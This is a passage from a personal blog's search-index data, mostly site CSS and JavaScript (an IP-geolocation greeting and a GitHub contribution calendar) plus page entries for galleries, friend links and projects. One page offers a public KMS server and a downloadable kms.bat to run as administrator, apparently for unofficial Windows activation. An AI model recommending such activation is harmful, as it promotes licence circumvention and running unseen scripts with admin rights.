background-position: center !important;\n  }\n#categoryBar li.category-list-item:hover {\n    background-size: 110% !important;\n    -webkit-box-shadow: inset 500px 50px 50px 50px rgba(50,50,50,0.6);\n    box-shadow: inset 500px 50px 50px 50px rgba(50,50,50,0.6);\n}\n#categoryBar li.category-list-item:hover span.category-list-count::after {\n    -webkit-transition: all 0.5s;\n    -moz-transition: all 0.5s;\n    -o-transition: all 0.5s;\n    -ms-transition: all 0.5s;\n    transition: all 0.5s;\n    -webkit-transform: translate(-100%, 0);\n    -moz-transform: translate(-100%, 0);\n    -o-transform: translate(-100%, 0);\n    -ms-transform: translate(-100%, 0);\n    transform: translate(-100%, 0);\n  }\n#categoryBar a.category-list-link {\n    color: #fff !important;\n    font-size: 20px !important;\n    padding: 15px!important;\n  }\n#categoryBar a.category-list-link::before {\n    content: '|' !important;\n    color: #fff !important;\n    font-size: 20px !important;\n  }\n#categoryBar a.category-list-link:after {\n    content: '';\n    position: relative;\n    width: 0;\n    bottom: 0;\n    display: block;\n    height: 3px;\n    border-radius: 3px;\n    background-color: #fff;\n  }\n#categoryBar .category-list-item:hover a.category-list-link:after {\n    width: 90%;\n    margin: 0 auto;\n    -webkit-transition: all 0.5s;\n    -moz-transition: all 0.5s;\n    -o-transition: all 0.5s;\n    -ms-transition: all 0.5s;\n    transition: all 0.5s;\n  }\n#categoryBar a.category-list-link:hover{\n    background-color: unset!important;\n    box-shadow: unset!important;\n}\n#categoryBar span.category-list-count {\n    color: #fff !important;\n    font-size: 20px !important;\n    position: relative;\n    top: -10px;\n  }\n  #categoryBar span.category-list-count::before {\n    content: '\\f02d' !important;\n    padding-right: 15px !important;\n    font-family: 'Font Awesome 6 Free';\n  }\n  #categoryBar span.category-list-count::after {\n    padding: 5px;\n    display: block !important;\n    color: #fff !important;\n    font-size: 20px !important;\n    position: relative;\n    right: -100%;\n  }\n  #categoryBar li.category-list-item {\n    width: 32.3% !important;\n  }\n  @media screen and (max-width: 650px) {\n    #categoryBar li.category-list-item {\n      width: 48% !important;\n      margin: 5px 1% 10px 1% !important;\n    }\n  }\n  #categoryBar .category-list::-webkit-scrollbar {\n    width: 0 !important;\n  }\n  @media screen and (max-width: 768px) {\n    .top{\n        padding: 5px;\n    }\n  }\n  .imgHover, .article-sort-item-img :first-child, #recent-posts > .recent-post-item .post_cover .post-bg, #aside-content .aside-list > .aside-list-item .thumbnail :first-child {\n    width: 100%;\n    height: 100%;\n    -webkit-transition: filter 375ms ease-in 0.2s, -webkit-transform 0.6s;\n    -moz-transition: filter 375ms ease-in 0.2s, -moz-transform 0.6s;\n    -o-transition: filter 375ms ease-in 0.2s, -o-transform 0.6s;\n    -ms-transition: filter 375ms ease-in 0.2s, -ms-transform 0.6s;\n    transition: filter 375ms ease-in 0.2s, transform 0.6s;\n    object-fit: cover;\n}\nimg[data-lazy-src]:not(.loaded) {\n    filter: blur(8px) brightness(1);\n}\n[data-theme='dark'] img,img[data-lazy-src].error{\n    filter: blur(0) brightness(0.8);\n}\n#ai-container{\n    margin: 10px;\n    border-radius: 10px;\n    border: 1px solid var(--fyz-border);\n    background-color: var(--fyz-white-acrylic1);\n}\n[data-theme=\"dark\"] #ai-container{\n    background-color: var(--fyz-black-acrylic1);\n}\n#ai-label{\n    position: absolute;\n    right: 20px;\n    background: white;\n    margin: 7px;\n    height: 59%;\n    font-size: 12px;\n    color: var(--fyz-theme);\n    line-height: 100%;\n    font-family: sans-serif;\n    padding: 4px;\n    border-radius: 5px;\n    transform: translateY(-2px);\n}\n#ai-header{\n    padding: 0 10px;\n    background-color: var(--fyz-theme);\n    border-radius: 10px 10px 0 0;\n    color: white;\n    opacity: 0.8;\n    font-size:17px;\n    position: relative;\n}\n#ai-content{\n    padding: 20px;\n    text-indent: 2em;\n    line-height:18px;\n}\n#ai-title{\n    color: white!important;\n    box-shadow: none!important;\n    border: none!important;\n    background: none!important;\n}\n#ai-content::after{\n    content: '|';\n    animation: blink 1s infinite\n}"},{"url":"/css/iconfont.css","content":"@font-face {\n  font-family: \"iconfont\"; /* Project id 3498204 */\n  src: url('/ttf/iconfont.ttf?v=1715597769535') format('truetype');\n}\n\n.iconfont {\n  font-family: \"iconfont\" !important;\n  font-size: inherit;\n  font-style: normal;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n  display: inline-block;\n}\n\n.icon-danmu:before {\n  content: \"\\e612\";\n}\n\n.icon-biaoqian:before {\n  content: \"\\e63d\";\n}\n\n.icon-fenlei:before {\n  content: \"\\e601\";\n}\n\n.icon-fanti:before {\n  content: \"\\e6d8\";\n}\n\n.icon-baidu:before {\n  content: \"\\e60a\";\n}\n\n.icon-csdn:before {\n  content: \"\\e600\";\n}\n\n.icon-RSS:before {\n  content: \"\\e78a\";\n}\n\n.icon-bilibili:before {\n  content: \"\\e609\";\n}\n\n.icon-gitee:before {\n  content: \"\\e60c\";\n}\n\n.icon-zhihu:before {\n  content: \"\\e60d\";\n}\n.icon-planet:before {\n  content: \"\\e617\"\n}\n\n.icon-monitor:before {\n  content: \"\\e6ad\";\n}\n\n.icon-global:before {\n  content: \"\\e78d\";\n}"},{"title":"相册","url":"/gallery/index.html","content":"\n<div class=\"gallery-group-main\">\n{% galleryGroup 旅行相册 一些外出旅游时拍摄的照片 /gallery/travel/ https://oss.fyz666.xyz/blogfiles/webp/3967a5f81f04965c826f8dcf1c910612.webp %}\n{% galleryGroup 你科校内随拍 在科大随手拍的一些照片 /gallery/ustc/ https://oss.fyz666.xyz/blogfiles/webp/abc6f4df8e93a8ebef4a12af3fdd27c8.webp %}\n</div>"},{"url":"/js/custom.js","content":"function setInfo(ip, city, distance, isCache) {\n    $('.welcome #local-ip').text(ip);\n    $('.welcome #city').text(city);\n    $('.welcome #distance').text(distance);\n    if (isCache) return;\n    var expiresDate= new Date();\n    expiresDate.setTime(expiresDate.getTime() + (5 * 60 * 1000));\n    var s = JSON.stringify({\n       \"ip\": ip,\n       \"city\": city,\n       \"distance\": distance\n    });\n    $.cookie('locationInfo', s, {expires: expiresDate, path: '/' });\n }\n function getDistance(e, t, n, o) {\n    const {sin: a, cos: s, asin: i, PI: c, hypot: r} = Math;\n    let l = (e,t)=>(e *= c / 180,\n    {\n       x: s(t *= c / 180) * s(e),\n       y: s(t) * a(e),\n       z: a(t)\n    })\n    , d = l(e, t)\n    , b = l(n, o)\n    , u = 2 * i(r(d.x - b.x, d.y - b.y, d.z - b.z) / 2) * 6371;\n    return Math.round(u)\n }\n function getIpInfo() {\n    if(!typeof jQuery) return;\n    if($('.card-announcement').css('display')===undefined||$('.card-announcement').css('display')===\"none\")\n       if (navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))\n          return;\n    if ($.cookie('locationInfo')) {\n       var data = JSON.parse($.cookie('locationInfo'));\n       setInfo(data['ip'], data['city'], data['distance'], true);\n       return;\n    }\n    $.ajax({\n       type: 'get',\n       url: 'https://apis.map.qq.com/ws/location/v1/ip',\n       data: {\n          key: 'SGYBZ-W6R6C-IHT2B-AH6JO-4DFLZ-IKF3H',\n          output: 'jsonp'\n       },\n       dataType: 'jsonp',\n       success: function(res) {\n          let { result = {} } = res\n          if(result && result.location) {\n             let distance = getDistance(117.22901, 31.82057, result.location.lng, result.location.lat);\n             setInfo(result.ip, result.ad_info.province + result.ad_info.city + result.ad_info.district, distance, false);\n          }\n       }\n    })\n }\n function download(src,name){\n    var x=new XMLHttpRequest();\n    x.open(\"GET\", src, true);\n    x.responseType = 'blob';\n    x.onload=function(e){\n       var url = window.URL.createObjectURL(x.response);\n       var a = document.createElement('a');\n       a.style.display = 'none';\n       a.href = url;\n       a.download = name;\n       a.click();\n       window.URL.revokeObjectURL(url);\n    }\n    x.send();\n }\n function categoryBarRandomColor() {\n    if($('#categoryBar').length>0){\n        $('#categoryBar .category-list-item').each(function(){\n            let r = Math.floor(Math.random() * 151) + 50\n            let g = Math.floor(Math.random() * 151) + 50\n            let b = Math.floor(Math.random() * 151) + 50\n            $(this).css('background', `rgb(${r},${g},${b})`);\n        });;\n    }\n }\n function loadAbstract() {\n    if(!document.querySelector(\"#article-container\")) return;\n    let key;\n    if ((match = location.pathname.match(/^\\/blog\\/(\\d+)\\/?/)) !== null) key = match[1];\n    else return;\n    try{document.querySelector(\".st\").remove()}catch(err){}\n    var http=new XMLHttpRequest();\n    http.open(\"GET\",`/abstract/${key}?t=${new Date().getTime()}`)\n    http.send();\n    http.onreadystatechange=(event)=>{\n        if(http.readyState==4){\n            if(http.status==200) var text = http.responseText.replace(/<[^>]*>/g, '');\n            else var text=\"文章摘要遇到异常。\";\n            const dom = document.querySelector('#ai-content')\n            const data = text;\n            function writing(index) {\n                if (index < data.length) {\n                    dom.innerHTML += data[index]\n                    setTimeout(writing.bind(this), 50, ++index)\n                }\n                else{\n                    var s=document.createElement(\"style\")\n                    s.className=\"st\";\n                    s.innerText=\"#ai-content::after{content:''!important;}\"\n                    document.body.appendChild(s)\n                }\n            }\n            writing(0);\n        }\n    }\n}\n $(document).on('pjax:success', function(event) {\n    if (window.a2a !== undefined) a2a.init_all();\n    getIpInfo();\n    renderGitHubCalendar();\n    loadAbstract();\n    categoryBarRandomColor();\n });\n $(document).on('pjax:error', function(event) {\n    Snackbar.show({\n      text: '似乎出了点问题，不妨刷新网页试试？',\n      pos: 'top-right',\n      showAction: false\n     });\n });\n $(document).on('click', 'a[download]', function(event) {\n    event.preventDefault();\n    const fileUrl = $(this).attr('href');\n    const fileName = $(this).attr('download');\n    download(fileUrl, fileName);\n });\n $(document).ready(function() {\n    getIpInfo();\n    renderGitHubCalendar();\n    loadAbstract();\n    categoryBarRandomColor();\n});"},{"url":"/js/githubcalendar.js","content":"var github_canlendar = (git_user, git_color) => {\n    var git_githubapiurl = \"https://github-calendar-api.fyz666.xyz/api?user=\" + git_user;\n    var git_fixed = 'fixed';\n    var git_px = 'px';\n    var git_month = ['一月', '二月', '三月', '四月', '五月', '六月', '七月', '八月', '九月', '十月', '十一月', '十二月'];\n    var git_monthchange = [];\n    var git_oneyearbeforeday = '';\n    var git_thisday = '';\n    var git_amonthago = '';\n    var git_aweekago = '';\n    var git_weekdatacore = 0;\n    var git_datacore = 0;\n    var git_total = 0;\n    var git_datadate = '';\n    var git_git_data = [];\n    var git_positionplusdata = [];\n    var git_firstweek = [];\n    var git_lastweek = [];\n    var git_beforeweek = [];\n    var git_thisweekdatacore = 0;\n    var git_mounthbeforeday = 0;\n    var git_mounthfirstindex = 0;\n    var git_crispedges = 'crispedges';\n    var git_thisdayindex = 0;\n    var git_amonthagoindex = 0;\n    var git_amonthagoweek = [];\n    var git_firstdate = [];\n    var git_first2date = [];\n    var git_montharrbefore = [];\n    var git_monthindex = 0;\n    var retinaCanvas = (canvas, context, ratio) => {\n        if (ratio > 1) {\n            var canvasWidth = canvas.width;\n            var canvasHeight = canvas.height;\n            canvas.width = canvasWidth * ratio;\n            canvas.height = canvasHeight * ratio;\n            canvas.style.width = '100%';\n            canvas.style.height = canvasHeight + 'px';\n            context.scale(ratio, ratio);\n        }\n    };\n    function responsiveChart() {\n        var ratio = window.devicePixelRatio || 1\n        var git_tooltip_container = document.getElementById('git_tooltip_container');\n        var git_x = '';\n        var git_y = '';\n        var git_span1 = '';\n        var git_span2 = '';\n        var c = document.getElementById(\"gitcanvas\");\n        c.style.width ='100%';\n        c.style.height ='';\n        var cmessage = document.getElementById(\"gitmessage\");\n        var ctx = c.getContext(\"2d\");\n        width = c.width = document.getElementById(\"gitcalendarcanvasbox\").offsetWidth;\n        height = c.height = 9 * 0.96 * c.width / git_data.length;\n        retinaCanvas(c,ctx, ratio)\n        var linemaxwitdh = height/ 9;\n        var lineminwitdh = 0.8 * linemaxwitdh;\n        var setposition = {x: 0.02 * width, y: 0.025 * width};\n        for (var week in git_data) {\n            weekdata = git_data[week];\n            for (var day in weekdata) {\n                var dataitem = {date: \"\", count: \"\", x: 0, y: 0};\n                git_positionplusdata.push(dataitem);\n                ctx.fillStyle = git_thiscolor(git_color, weekdata[day].count);\n                setposition.y = Math.round(setposition.y * 100) / 100;\n                dataitem.date = weekdata[day].date;\n                dataitem.count = weekdata[day].count;\n                dataitem.x = setposition.x;\n                dataitem.y = setposition.y;\n                ctx.fillRect(setposition.x, setposition.y, lineminwitdh, lineminwitdh);\n                setposition.y = setposition.y + linemaxwitdh\n            }\n            setposition.y = 0.025 * width;\n            setposition.x = setposition.x + linemaxwitdh\n        }\n        if (document.body.clientWidth > 700) {\n            ctx.font = \"600  Arial\";\n            ctx.fillStyle = '#aaa';\n            ctx.fillText(\"日\", 0, 1.9 * linemaxwitdh);\n            ctx.fillText(\"二\", 0, 3.9 * linemaxwitdh);\n            ctx.fillText(\"四\", 0, 5.9 * linemaxwitdh);\n            ctx.fillText(\"六\", 0, 7.9 * linemaxwitdh);\n            var monthindexlist = width / 24;\n            for (var index in git_monthchange) {\n                ctx.fillText(git_monthchange[index], monthindexlist, 0.7 * linemaxwitdh);\n                monthindexlist = monthindexlist + width / 12\n            }\n        }\n        c.onmousemove = function (event) {\n            if (document.querySelector('.gitmessage')) {\n                git_tooltip_container.innerHTML = \"\"\n            }\n            getMousePos(c, event)\n        };\n        git_tooltip_container.onmousemove = function (event) {\n            if (document.querySelector('.gitmessage')) {\n                git_tooltip_container.innerHTML = \"\"\n            }\n        };\n\n        function getMousePos(canvas, event) {\n            var rect = canvas.getBoundingClientRect();\n            var x = event.clientX - rect.left * (canvas.width / rect.width);\n            var y = event.clientY - rect.top * (canvas.height / rect.height);\n            for (var item of git_positionplusdata) {\n                var lenthx = x - item.x;\n                var lenthy = y - item.y;\n                if (0 < lenthx && lenthx < lineminwitdh) {\n                    if (0 < lenthy && lenthy < lineminwitdh) {\n                        git_span1 = item.date;\n                        git_span2 = item.count;\n                        git_x = event.clientX - 100;\n                        git_y = event.clientY - 60;\n                        html = tooltip_html(git_x, git_y, git_span1, git_span2);\n                        append_div_gitcalendar(git_tooltip_container, html)\n                    }\n                }\n            }\n        }\n    }\n\n    function addlastmonth() {\n        if (git_thisdayindex === 0) {\n            thisweekcore(52);\n            thisweekcore(51);\n            thisweekcore(50);\n            thisweekcore(49);\n            thisweekcore(48);\n            git_thisweekdatacore += git_firstdate[6].count;\n            git_amonthago = git_firstdate[6].date\n        } else {\n            thisweekcore(52);\n            thisweekcore(51);\n            thisweekcore(50);\n            thisweekcore(49);\n            thisweek2core();\n            git_amonthago = git_first2date[git_thisdayindex - 1].date\n        }\n    }\n\n    function thisweek2core() {\n        for (var i = git_thisdayindex - 1; i < git_first2date.length; i++) {\n            git_thisweekdatacore += git_first2date[i].count\n        }\n    }\n\n    function thisweekcore(index) {\n        for (var item of git_data[index]) {\n            git_thisweekdatacore += item.count\n        }\n    }\n\n    function addlastweek() {\n        for (var item of git_lastweek) {\n            git_weekdatacore += item.count\n        }\n    }\n\n    function addbeforeweek() {\n        for (var i = git_thisdayindex; i < git_beforeweek.length; i++) {\n            git_weekdatacore += git_beforeweek[i].count\n        }\n    }\n\n    function addweek(data) {\n        if (git_thisdayindex === 6) {\n            git_aweekago = git_lastweek[0].date;\n            addlastweek()\n        } else {\n            lastweek = data.contributions[51];\n            git_aweekago = lastweek[git_thisdayindex + 1].date;\n            addlastweek();\n            addbeforeweek()\n        }\n    }\n\n    fetch(git_githubapiurl).then(data => data.json()).then(data => {\n        git_data = data.contributions;\n        git_total = data.total;\n        git_first2date = git_data[48];\n        git_firstdate = git_data[47];\n        git_firstweek = data.contributions[0];\n        git_lastweek = data.contributions[52];\n        git_beforeweek = data.contributions[51];\n        git_thisdayindex = git_lastweek.length - 1;\n        git_thisday = git_lastweek[git_thisdayindex].date;\n        git_oneyearbeforeday = git_firstweek[0].date;\n        git_monthindex = git_thisday.substring(5, 7) * 1;\n        git_montharrbefore = git_month.splice(git_monthindex, 12 - git_monthindex);\n        git_monthchange = git_montharrbefore.concat(git_month);\n        addweek(data);\n        addlastmonth();\n        var html = github_main_box(git_monthchange, git_data, git_user, git_color, git_total, git_thisweekdatacore, git_weekdatacore, git_oneyearbeforeday, git_thisday, git_aweekago, git_amonthago);\n        append_div_gitcalendar(github_container, html);\n        if(document.getElementById('github_loading')){\n            document.getElementById('github_loading').remove()};\n        responsiveChart()\n    }).catch(function (error) {\n        console.log(error)\n    });\n    window.onresize = function () {\n        responsiveChart()\n    };\n    window.onscroll = function () {\n        if (document.querySelector('.gitmessage')) {\n            git_tooltip_container.innerHTML = \"\"\n        }\n    };\n    var git_thiscolor = (color, x) => {\n        if (x === 0) {\n            var i = parseInt(x / 2);\n            return color[0]\n        } else if (x < 2) {\n            return color[1]\n        } else if (x < 20) {\n            var i = parseInt(x / 2);\n            return color[i]\n        } else {\n            return color[9]\n        }\n    };\n    var tooltip_html = (x, y, span1, span2) => {\n        var html = '';\n        html += '<div class=\"gitmessage\" style=\"top:' + y + 'px;left:' + x + 'px;position: fixed;z-index:9999\"><div class=\"angle-wrapper\" style=\"display:block;\"><span>' + span1 + '&nbsp;</span><span>' + span2 + ' 次上传</span></div></div>';\n        return html\n    };\n    var github_canvas_box = () => {\n        var html = '<div id=\"gitcalendarcanvasbox\"> <canvas id=\"gitcanvas\" style=\"animation: none;\"></canvas></div>';\n        return html\n    };\n    var github_info_box = (user, color) => {\n        var html = '';\n        html += '<div id=\"git_tooltip_container\"></div><div class=\"contrib-footer clearfix mt-1 mx-3 px-3 pb-1\"><div class=\"float-left text-gray\">数据来源 <a href=\"https://github.com/' + user + '\" target=\"blank\">@' + user + '</a></div><div class=\"contrib-legend text-gray\">Less <ul class=\"legend\"><li style=\"background-color:' + color[0] + '\"></li><li style=\"background-color:' + color[2] + '\"></li><li style=\"background-color:' + color[4] + '\"></li><li style=\"background-color:' + color[6] + '\"></li><li style=\"background-color:' + color[8] + '\"></li></ul>More </div></div>';\n        return html\n    };\n    var github_main_box = (monthchange, git_data, user, color, total, thisweekdatacore, weekdatacore, oneyearbeforeday, thisday, aweekago, amonthago) => {\n        var html = '';\n        var canvasbox = github_canvas_box();\n        var infobox = github_info_box(user, color);\n        var style = github_main_style();\n        html += '<div class=\"position-relative\"><div class=\"border py-2 graph-before-activity-overview\"><div class=\"js-gitcalendar-graph mx-md-2 mx-3 d-flex flex-column flex-items-end flex-xl-items-center overflow-hidden pt-1 is-graph-loading graph-canvas gitcalendar-graph height-full text-center\">' + canvasbox + '</div>' + infobox + '</div></div>';\n        html += '<div style=\"display:flex;width:100%\"><div class=\"contrib-column contrib-column-first table-column\"><span class=\"text-muted\">过去一年提交</span><span class=\"contrib-number\">' + total + '</span><span class=\"text-muted\">' + oneyearbeforeday + '&nbsp;-&nbsp;' + thisday + '</span></div><div class=\"contrib-column table-column\"><span class=\"text-muted\">最近一月提交</span><span class=\"contrib-number\">' + thisweekdatacore + '</span><span class=\"text-muted\">' + amonthago + '&nbsp;-&nbsp;' + thisday + '</span></div><div class=\"contrib-column table-column\"><span class=\"text-muted\">最近一周提交</span><span class=\"contrib-number\">' + weekdatacore + '</span><span class=\"text-muted\">' + aweekago + '&nbsp;-&nbsp;' + thisday + '</span></div></div>' + style;\n        return html\n    };\n    var github_main_style = () => {\n        style = '<style>#github_container{text-align:center;margin:0 auto;width:100%;display:flex;display:-webkit-flex;justify-content:center;align-items:center;flex-wrap:wrap;}.gitcalendar-graph text.wday,.gitcalendar-graph text.month{font-size:10px;fill:#aaa;}.contrib-legend{text-align:right;padding:0 14px 10px 0;display:inline-block;float:right;}.contrib-legend .legend{display:inline-block;list-style:none;margin:0 5px;position:relative;bottom:-1px;padding:0;}.contrib-legend .legend li{display:inline-block;width:10px;height:10px;}.text-small{font-size:12px;color:#767676;}.gitcalendar-graph{padding:15px 0 0;text-align:center;}.contrib-column{text-align:center;border-left:1px solid #ddd;border-top:1px solid #ddd;font-size:11px;}.contrib-column-first{border-left:0;}.table-column{padding:10px;display:table-cell;flex:1;vertical-align:top;}.contrib-number{font-weight:300;line-height:1.3em;font-size:24px;display:block;}.gitcalendar img.spinner{width:70px;margin-top:50px;min-height:70px;}.monospace{text-align:center;color:#000;font-family:monospace;}.monospace a{color:#1D75AB;text-decoration:none;}.contrib-footer{font-size:11px;padding:0 10px 12px;text-align:left;width:100%;box-sizing:border-box;height:26px;}.left.text-muted{float:left;margin-left:9px;color:#767676;}.left.text-muted a{color:#4078c0;text-decoration:none;}.left.text-muted a:hover,.monospace a:hover{text-decoration:underline;}h2.f4.text-normal.mb-3{display:none;}.float-left.text-gray{float:left;}#user-activity-overview{display:none;}.day-tooltip{white-space:nowrap;position:absolute;z-index:99999;padding:10px;font-size:12px;color:#959da5;text-align:center;background:rgba(0,0,0,.85);border-radius:3px;display:none;pointer-events:none;}.day-tooltip strong{color:#dfe2e5;}.day-tooltip.is-visible{display:block;}.day-tooltip:after{position:absolute;bottom:-10px;left:50%;width:5px;height:5px;box-sizing:border-box;margin:0 0 0 -5px;content:\" \";border:5px solid transparent;border-top-color:rgba(0,0,0,.85)}.position-relative{width:100%;}@media screen and (max-width:650px){.contrib-column{display:none}}.angle-wrapper{z-index:9999;display:inline;width:200px;height:40px;position:relative;padding:5px 0;background:rgba(0,0,0,0.8);border-radius:8px;text-align:center;color:white;}.angle-box{position:fixed;padding:10px}.angle-wrapper span{padding-bottom:1em;}.angle-wrapper:before{content:\"\";width:0;height:0;border:10px solid transparent;border-top-color:rgba(0,0,0,0.8);position:absolute;left:47.5%;top:100%;}</style>';\n        return style\n    }\n};\nvar append_div_gitcalendar = (parent, text) => {\n    if (typeof text === 'string') {\n        var temp = document.createElement('div');\n        temp.innerHTML = text;\n        var frag = document.createDocumentFragment();\n        while (temp.firstChild) {\n            frag.appendChild(temp.firstChild)\n        }\n        parent.appendChild(frag)\n    } else {\n        parent.appendChild(text)\n    }\n};\nvar loading_git = (color) => {\n    loading = '<div id=\"github_loading\" style=\"height:100%;display: flex;align-items: center;justify-content: center;\"><svg style=\"height:50px;\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"  viewBox=\"0 0 50 50\" style=\"enable-background:new 0 0 50 50\" xml:space=\"preserve\"><path fill=\"' + color + '\" d=\"M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z\" transform=\"rotate(275.098 25 25)\"><animateTransform attributeType=\"xml\" attributeName=\"transform\" type=\"rotate\" from=\"0 25 25\" to=\"360 25 25\" dur=\"0.6s\" repeatCount=\"indefinite\"></animateTransform></path></svg></div>';\n    return loading\n};\nvar renderGitHubCalendar = () => {\n    if (!document.getElementById('github_container'))return;\n    var git_user = 'windshadow233';\n    var github_container = document.getElementsByClassName('github_container')[0];\n    var github_loading = document.getElementById('github_loading');\n    var git_purple = ['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f',];\n    var git_green = ['#ebedf0', '#f0fff4', '#dcffe4', '#bef5cb', '#85e89d', '#34d058', '#28a745', '#22863a', '#176f2c', '#165c26', '#144620'];\n    var git_blue = ['#ebedf0', '#f1f8ff', '#dbedff', '#c8e1ff', '#79b8ff', '#2188ff', '#0366d6', '#005cc5', '#044289', '#032f62', '#05264c',];\n    var git_pink = ['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];\n    var git_color = git_purple;\n    append_div_gitcalendar(github_container, loading_git(git_color[4]));\n    github_canlendar(git_user, git_color)\n};"},{"title":"KMS服务器","url":"/kms/index.html","content":"\n博主长期提供一台KMS服务器：kms.fyz666.xyz，使用方法如下：\n\n1. 请将下面的kms.bat激活程序下载到电脑本地。（嘿嘿，我不会告诉你该程序抄自zbh.ustc.edu.cn）\n2. 鼠标右键该程序，选择“以管理员身份运行”，然后请按提示操作，若不以管理员身份运行会导致激活失败！\n\n<a class=\"download\" href=\"https://oss.fyz666.xyz/blogfiles/blank/03b2d3ec1f20067fb3bf865bd69bc233\" download=\"kms.bat\">kms.bat</a>\n"},{"url":"/people/index.html","content":"\n<link rel=\"stylesheet\" href=\"https://oss.fyz666.xyz/blogfiles/css/people.css\">\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js\"></script>\n<canvas id=\"canvas\"></canvas>\n<script src=\"https://oss.fyz666.xyz/blogfiles/js/people.js\"></script>"},{"title":"友情链接","url":"/link/index.html","content":"\n<script>\nfunction copyFlinkTemplate() {\n    const text = `\\`\\`\\`yaml\n- name: #博客名称\n  link: #博客地址\n  avatar: #博客头像\n  descr: #来点介绍\n\\`\\`\\``;\n    navigator.clipboard.writeText(text).then(function() {\n        Snackbar.show({\n            text: '已复制模板！快去评论区留言吧～',\n            pos: 'top-right',\n            showAction: false\n        });\n    }, function(err) {\n        Snackbar.show({\n            text: '好像没复制成功，或许检查一下剪切板权限？',\n            pos: 'top-right',\n            showAction: false\n        });\n    });\n    e.dispatchEvent(t);\n}\n</script>\n\n## 如何申请友链?\n\n{% btn 'javascript:copyFlinkTemplate();',快速复制模板,far fa-hand-point-right,outline blue larger %}\n\n{% hideToggle 我的友链信息 %}\n\n{% note primary simple %}\n\n- 我的名称: 逸风亭 / Shelter for Wind\n- 网站地址: `https://blog.fyz666.xyz/`\n- 网站图标: `https://blog.fyz666.xyz/images/avatar.png`\n- 描述: 行所欲行，无问西东。(您也可自己归纳)\n\n{% endnote %}\n\n{% tabs templates %}\n\n<!-- tab Butterfly -->\n```yaml\n- name: 逸风亭\n  link: https://blog.fyz666.xyz/\n  avatar: https://blog.fyz666.xyz/images/avatar.png\n  descr: 行所欲行，无问西东。\n```\n<!-- endtab -->\n\n<!-- tab Candy -->\n```yaml\n- name: 逸风亭\n  link: https://blog.fyz666.xyz/\n  avatar: https://blog.fyz666.xyz/images/avatar.png\n  descr: 行所欲行，无问西东。\n  siteshot: https://s2.loli.net/2024/04/23/qU5AHNo2agutiEc.jpg\n```\n<!-- endtab -->\n\n<!-- tab Fluid -->\n```yaml\n- {\n  title: '逸风亭',\n  intro: '行所欲行，无问西东。',\n  link: 'https://blog.fyz666.xyz/',\n  image: 'https://blog.fyz666.xyz/images/avatar.png'\n}\n```\n<!-- endtab -->\n\n<!-- tab JSON -->\n```json\n{\n  \"title\": \"逸风亭\",\n  \"link\": \"https://blog.fyz666.xyz/\",\n  \"avatar\": \"https://blog.fyz666.xyz/images/avatar.png\",\n  \"descr\": \"行所欲行，无问西东。\"\n}\n```\n<!-- endtab -->\n\n<!-- tab HTML -->\n```markup\n<a href=\"https://blog.fyz666.xyz/ rel=\"external nofollow\">逸风亭</a>\n```\n<!-- endtab -->\n\n<!-- tab Jade -->\n```pug\na(href='https://blog.fyz666.xyz/' rel=\"external nofollow\") 逸风亭\n```\n<!-- endtab -->\n\n{% endtabs %}\n\n{% endhideToggle %}\n"},{"title":"我的一些GitHub仓库","url":"/projects/index.html","content":"\n<div class=\"gallery-group-main\">\n{% galleryGroup This-Repo-Has-0-Stars 欢迎大家来Star！ https://github.com/windshadow233/This-Repo-Has-10-Stars https://oss.fyz666.xyz/blogfiles/jpg/f6dcee986664cee029bafafbf99da28f.jpg %}\n{% galleryGroup Blog 此博客的源码 https://github.com/windshadow233/windshadow233.github.io https://oss.fyz666.xyz/blogfiles/webp/633c3cf45c466d1463814424f4935049.webp %}\n{% galleryGroup Mahjong-AI 基于Suphx的立直麻将AI https://github.com/windshadow233/Mahjong-AI https://oss.fyz666.xyz/blogfiles/webp/016670c978a8cc5a5cc0bee7f449cf79.webp %}\n{% galleryGroup python-chinese-chess 随便写的中国象棋库 https://github.com/windshadow233/python-chinese-chess https://oss.fyz666.xyz/blogfiles/jpeg/d7de51afd626ccbc9d1d7f64f02f0493.jpeg %}\n{% galleryGroup autograd-with-numpy 基于Numpy实现的自动求导(玩具)框架 https://github.com/windshadow233/autograd-with-numpy https://oss.fyz666.xyz/blogfiles/jpg/fb23eacda1c2fce6ae815364d5b90395.jpg %}\n{% galleryGroup pvz-toolkit 用于学习的植物大战僵尸修改器 https://github.com/windshadow233/pvz-toolkit https://oss.fyz666.xyz/blogfiles/jpg/f6860b62b3409a4db13718764c7142d8.jpg %}\n{% galleryGroup Riichi-Calculator 写着玩的立直麻将计算器 https://github.com/windshadow233/Riichi-Calculator https://oss.fyz666.xyz/blogfiles/webp/172f103e6c57092ed49a8af377cc2694.webp %}\n{% galleryGroup PGGAN PGGAN的PyTorch实现 https://github.com/windshadow233/PGGAN https://oss.fyz666.xyz/blogfiles/jpg/3c9f34aa3e89bc747ff773e84720ce1d.jpg %}\n{% galleryGroup Frontend-Table-Of-Contents 瞎写的纯前端目录生成器 https://github.com/windshadow233/Frontend-Table-Of-Contents https://oss.fyz666.xyz/blogfiles/jpg/cac46987629a660a8e053450c8de7649.jpg %}\n{% galleryGroup HandWritten-Transformer-NMT 深度学习课程实验 https://github.com/windshadow233/HandWritten-Transformer-NMT https://oss.fyz666.xyz/blogfiles/jpg/7e82242d9560bc25e70a6d80d636e1fe.jpg %}\n{% galleryGroup DKN-NewsRecommendation 深度学习课程大作业 https://github.com/windshadow233/DKN-NewsRecommendation https://oss.fyz666.xyz/blogfiles/jpg/0b79595734b96d0dc8c65f1e56c16f93.jpg %}\n</div>"},{"title":"在线资源","url":"/rlink/index.html"},{"title":"标签","url":"/tags/index.html"},{"title":"在线工具与服务","url":"/tlink/index.html"},{"title":"旅行相册","url":"/gallery/travel/index.html","content":"\n\n<div class=\"gallery-group-main\">\n{% galleryGroup 